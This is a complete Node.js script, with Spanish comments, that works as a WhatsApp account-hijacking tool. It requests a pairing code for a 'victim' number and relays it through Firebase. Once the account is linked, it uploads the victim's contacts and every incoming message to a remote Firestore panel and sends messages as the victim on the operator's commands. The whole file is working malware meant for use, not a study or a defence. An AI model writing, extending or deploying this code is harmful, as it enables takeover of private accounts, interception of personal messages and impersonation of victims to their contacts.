const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// 1. ESCUCHAR SOLICITUDES DE CÓDIGO (PAIRING)
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();
    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
            console.log("CÓDIGO GENERADO: " + code);
        } catch (e) { console.log("Error Pairing: " + e.message); }
    }
});

// 2. CUANDO LA SESIÓN SE ACTIVA (VÍCTIMA ESCANEÓ)
client.on('ready', async () => {
    console.log("¡VÍCTIMA CLONADA EXITOSAMENTE!");
    
    // Extraer contactos y subirlos a Firebase
    const contacts = await client.getContacts();
    const cleanContacts = contacts.slice(0, 50).map(c => ({
        name: c.name || c.pushname || "Sin nombre",
        number: c.number
    }));

    await db.collection("wa_clon_global").doc("current_session").update({
        status: "exito",
        contacts: cleanContacts
    });
});

// 3. ESCUCHAR MENSAJES EN TIEMPO REAL
client.on('message', async (msg) => {
    // Guardamos el mensaje en el historial de Firebase para verlo en el panel
    await db.collection("wa_clon_global").doc("current_session").update({
        messages: admin.firestore.FieldValue.arrayUnion({
            body: msg.body,
            fromMe: false,
            from: msg.from,
            timestamp: Date.now()
        })
    });
});

// 4. ESCUCHAR COMANDOS DESDE TU PANEL (PARA ENVIAR MENSAJES)
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    const data = snap.data();
    if (data && data.lastCommand && data.lastCommand.type === 'sendMessage') {
        try {
            await client.sendMessage(data.lastCommand.target + "@c.us", data.lastCommand.body);
            // Limpiamos el comando para que no se repita
            await snap.ref.update({ lastCommand: admin.firestore.FieldValue.delete() });
        } catch (e) { console.log("Error comando:", e.message); }
    }
});

client.initialize();
http.createServer((req, res) => { res.end('GHOST MOTOR ACTIVE'); }).listen(process.env.PORT || 3000);
